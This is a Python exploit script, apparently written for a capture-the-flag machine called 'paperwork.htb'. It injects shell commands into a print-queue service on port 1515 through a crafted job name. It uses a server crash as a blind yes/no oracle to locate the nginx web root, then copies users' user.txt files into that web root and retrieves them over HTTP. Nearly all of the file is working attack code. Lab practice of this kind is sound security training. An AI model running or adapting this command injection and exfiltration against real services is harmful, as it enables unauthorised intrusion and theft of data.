#!/usr/bin/env python3
"""Find web root by reading nginx config via RCE + oracle."""
import socket, time, select, sys

T = '10.129.38.158'

def lpd(jn):
    s = socket.socket(); s.settimeout(8)
    try:
        s.connect((T, 1515))
        s.send(b'\x02archive_intake\n'); time.sleep(0.1)
        ready = select.select([s], [], [], 1)
        if ready[0]: s.recv(1024)
        ct = f'J{jn}\n'.encode()
        s.send(b'\x02' + str(len(ct)).encode() + b'\n')
        time.sleep(0.2)
        ready = select.select([s], [], [], 3)
        if ready[0]: s.recv(1024)
        s.send(ct); time.sleep(0.2); s.recv(4096)
    except: pass
    finally: s.close()

def alive():
    s=socket.socket();s.settimeout(2)
    try:
        s.connect((T,1515));s.send(b'\x03');d=s.recv(4096);s.close();return True
    except: return False

def kill_if(cond):
    lpd(f"';{cond} && pkill -f server.py;echo '")
    time.sleep(0.1)
    a = alive()
    if not a:
        for _ in range(20):
            time.sleep(0.3)
            if alive(): break
        return True
    return False

def shell(cmd):
    """Execute shell command, no return value."""
    lpd(f"';{cmd};echo '")

# Step 1: Extract root directive from nginx config
print("=== Step 1: Extract nginx root directive ===", flush=True)

# Use grep to find root directives and write to /tmp/
shell("grep -E 'root|alias' /etc/nginx/sites-enabled/default > /tmp/ng_roots 2>&1")
time.sleep(0.5)
shell("sed -n 's/.*root\\s\\+\\([^;]\\+\\);.*/\\1/p' /etc/nginx/sites-enabled/default > /tmp/ng_root 2>&1")
time.sleep(0.5)

# Check common paths without needing oracle extraction
paths = [
    '/var/www/html', '/usr/share/nginx/html', '/var/www',
    '/srv/http', '/opt/www', '/var/www/paperwork.htb',
    '/var/www/html/paperwork', '/var/www/html/intranet',
    '/home/www', '/data/www', '/usr/local/www',
]

for p in paths:
    if kill_if(f'grep -qF "{p}" /tmp/ng_root 2>/dev/null || grep -qF "{p}" /tmp/ng_roots 2>/dev/null'):
        print(f"  WEB ROOT: {p}", flush=True)
        web_root = p
        break
    time.sleep(0.1)
else:
    print("  Could not find web root via grep.", flush=True)
    web_root = None

# Step 2: Try to write flag to web root
if web_root:
    print(f"\n=== Step 2: Write flag to {web_root} ===", flush=True)
    shell(f"cat /home/*/user.txt 2>/dev/null | head -50 > {web_root}/FLAG_OUT 2>&1")
    time.sleep(1)
else:
    # Try alternative: write to ALL possible locations at once
    print("\n=== Step 2: Trying all paths ===", flush=True)
    for p in paths:
        shell(f"cat /home/*/user.txt 2>/dev/null > {p}/FLAG_OUT 2>&1")
    time.sleep(1)

# Step 3: Check HTTP endpoints
print("\n=== Step 3: Check HTTP ===", flush=True)
import urllib.request, urllib.error
for url in ['/FLAG_OUT', '/flag_out', '/flag']:
    try:
        req = urllib.request.Request(f'http://{T}{url}', headers={'Host': 'paperwork.htb'})
        resp = urllib.request.urlopen(req, timeout=4)
        body = resp.read().decode(errors='replace')
        if 'HTB{' in body:
            print(f"  *** FLAG at {url}: {body.strip()} ***", flush=True)
            with open('/tmp/flag_found.txt', 'w') as f:
                f.write(body.strip())
            sys.exit(0)
        else:
            print(f"  {url}: HTTP {resp.status} ({body[:100]})", flush=True)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace')[:100] if hasattr(e, 'read') else ''
        print(f"  {url}: HTTP {e.code} ({body})", flush=True)
    except Exception as e:
        print(f"  {url}: {e}", flush=True)
    time.sleep(0.2)

# Step 4: Also check if we can write to /download/archive location
print("\n=== Step 4: Find archive ZIP location ===", flush=True)
shell("find / -name 'paperwork-archive*' -type f 2>/dev/null > /tmp/zip_locs")
time.sleep(0.5)
for d in ['/var/www', '/opt', '/srv', '/usr/local', '/etc/nginx']:
    if kill_if(f'grep -q \"^{d}\" /tmp/zip_locs 2>/dev/null'):
        print(f"  ZIP might be under {d}", flush=True)
        shell(f"ls -la {d}/ > /tmp/ls_{d.replace('/', '_')} 2>&1")
    time.sleep(0.1)

print("\nDone. Flag not found via web exfiltration.", flush=True)
